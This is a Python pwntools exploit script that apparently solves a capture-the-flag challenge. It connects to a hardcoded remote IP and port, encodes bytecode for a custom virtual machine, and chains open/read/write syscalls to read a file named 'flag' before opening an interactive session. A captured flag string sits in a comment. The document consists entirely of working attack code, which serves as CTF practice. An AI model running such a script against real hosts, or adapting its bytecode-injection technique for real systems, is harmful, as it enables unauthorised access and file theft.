#!/usr/bin/env python
from pwn import *

# FLAG{WHAT___THE!!_I_didnt_SLEEP_L@stNight_How_ABOUT_Y0u:(}

host , port = '110.10.147.126' , 9080
y = remote( host , port )


# 401E21
# process 0x4089a2

'''

5     3   4    4    16
11111 111 1111 1111 111...
op    sub r1   r2   imm

reg[9] = rsp
reg[10] = rbp
reg[0xe,14] = rip


'''

# 0x401db1


def t( a ):
    return ''.join( hex(ord(_))[2:].rjust(2,'0') for _ in a )

def pac( a ):
    return p32( a )[::-1]

def mov( r1 , r2 , imm = 0 , c = 0 ):
    p = 0xf << 27
    p += ( 5 if c else 3 ) << 24
    p += r1 << 20
    p += r2 << 16
    p += imm
    return pac( p )


def _open( buf ):
    p = mov( 1 , 0 , imm = buf , c = 1 )
    p += mov( 8 , 0 , imm = 1 , c = 1 ) + pac( 0x1e << 27 )
    return p

def _read( fd , buf , l ):
    p = mov( 1  , 0 , imm = fd , c = 1 )
    p += mov( 2  , 0 , imm = buf , c = 1 )
    p += mov( 3  , 0 , imm = l , c = 1 )
    p += mov( 8 , 0 , imm = 2 , c = 1 ) + pac( 0x1e << 27 )
    return p

def _write( fd , buf , l ):
    p = mov( 1  , 0 , imm = fd , c = 1 )
    p += mov( 2  , 0 , imm = buf , c = 1 )
    p += mov( 3  , 0 , imm = l , c = 1 )
    p += mov( 8 , 0 , imm = 3 , c = 1 ) + pac( 0x1e << 27 )
    return p


p = _read( 0 , 0 , 0x20 )
p += mov( 2 , 0 , imm = 0xdada , c = 1 ) + pac( 0x1e << 27 )
#p += mov( 2 , 0 , imm = 0xdada , c = 1 ) + pac( 0x1e << 27 )
p += mov( 8 , 0 , imm = 1 , c = 1 ) + pac( 0x1e << 27 )

p += mov( 1 , 0  )

p += mov( 2 , 0 , imm = 0x20 , c = 1 )
p += mov( 3 , 0 , imm = 0x70 , c = 1 )
p += mov( 8 , 0 , imm = 2 , c = 1 ) + pac( 0x1e << 27 )

p += mov( 1 , 0 , imm = 1 , c = 1 )
p += mov( 8 , 0 , imm = 3 , c = 1 ) + pac( 0x1e << 27 )

print hex( len( t( p ) ) )
print t( p )

y.sendlineafter( '[>] Input ByteCode to Run' , t( p ) )

y.sendline( 'flag\x00' )
sleep( 1 )
y.send( '\0' * 0x10 )



y.interactive()